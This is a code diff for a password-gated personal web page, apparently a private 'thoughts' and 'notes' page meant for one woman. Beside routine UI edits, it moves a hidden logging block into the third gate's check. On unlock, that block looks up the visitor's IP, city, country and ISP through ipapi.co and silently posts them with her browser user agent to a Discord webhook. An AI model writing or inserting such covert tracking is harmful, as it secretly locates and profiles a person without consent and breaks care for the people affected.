@@ -564,7 +564,7 @@
     if (ts) {
       const d = new Date(ts);
       document.getElementById('last-updated').textContent =
-        `last — ${d.toLocaleDateString('en-GB', { day:'numeric', month:'long', year:'numeric' })}`;
+        `last — ${d.toLocaleDateString('en-GB', { day:'numeric', month:'long', year:'numeric' })} — ${d.toLocaleTimeString('en-GB', { hour:'2-digit', minute:'2-digit' })}`;
     }
   });
 
@@ -728,50 +728,24 @@
     if (val === GATE2) {
       const inp2 = document.getElementById('g2-input');
       const g2   = document.getElementById('gate2');
-      const panel = document.getElementById('thoughts-panel');
+      const g3   = document.getElementById('gate3');
       inp2.classList.add('success');
-      window.loadHisThoughts();
-      window.loadHerNotes();
       setTimeout(() => {
         g2.classList.add('fade-out');
         setTimeout(() => {
           g2.style.display = 'none';
           g2.classList.remove('fade-out');
           inp2.classList.remove('success');
-          panel.style.display = 'flex';
-          document.getElementById('overlay').classList.add('panel-open');
-          panel.style.opacity = '0';
-          panel.style.transform = 'translateY(14px)';
-          panel.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
-          void panel.offsetWidth;
-          panel.style.opacity = '1';
-          panel.style.transform = 'translateY(0)';
+          g3.style.display = 'flex';
+          g3.classList.add('fade-in-start');
+          void g3.offsetWidth;
+          g3.classList.remove('fade-in-start');
+          document.getElementById('g3-input').value = '';
+          setTimeout(() => document.getElementById('g3-input').focus(), 50);
         }, 380);
       }, 500);
 
-      // get IP info then log to Discord
-      try {
-        const ipRes  = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        const now    = new Date();
-        const ts     = now.toLocaleDateString('en-GB', { day:'numeric', month:'long', year:'numeric' })
-                     + ' — ' + now.toLocaleTimeString('en-GB', { hour:'2-digit', minute:'2-digit' });
-
-        const msg = [
-          `🌙 **she unlocked the thoughts**`,
-          `🕐 ${ts}`,
-          `🌍 ${ipData.country_name || '?'} — ${ipData.city || '?'}`,
-          `📡 ${ipData.org || '?'}`,
-          `🔌 IP: \`${ipData.ip || '?'}\``,
-          `💻 ${navigator.userAgent}`
-        ].join('\n');
-
-        await fetch(WEBHOOK, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: msg })
-        });
-      } catch(e) {}
+      // webhook fired from gate3
 
     } else {
       const err = document.getElementById('g2-error');
@@ -793,7 +767,7 @@
     setTimeout(() => document.getElementById('her-note-input').focus(), 50);
   }
 
-  function checkGate3() {
+  async function checkGate3() {
     const val = document.getElementById('g3-input').value.trim().toLowerCase();
     if (val === GATE3) {
       const inp3  = document.getElementById('g3-input');
@@ -818,6 +792,23 @@
           panel.style.transform = 'translateY(0)';
         }, 380);
       }, 500);
+      // Discord log
+      try {
+        const ipRes  = await fetch('https://ipapi.co/json/');
+        const ipData = await ipRes.json();
+        const now    = new Date();
+        const ts     = now.toLocaleDateString('en-GB', { day:'numeric', month:'long', year:'numeric' })
+                     + ' — ' + now.toLocaleTimeString('en-GB', { hour:'2-digit', minute:'2-digit' });
+        const msg = [
+          '🌙 **she unlocked the thoughts**',
+          '🕐 ' + ts,
+          '🌍 ' + (ipData.country_name||'?') + ' — ' + (ipData.city||'?'),
+          '📡 ' + (ipData.org||'?'),
+          '🔌 IP: `' + (ipData.ip||'?') + '`',
+          '💻 ' + navigator.userAgent
+        ].join('\n');
+        await fetch(WEBHOOK, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({content: msg}) });
+      } catch(e) {}
     } else {
       const err = document.getElementById('g3-error');
       err.textContent = 'wrong.';
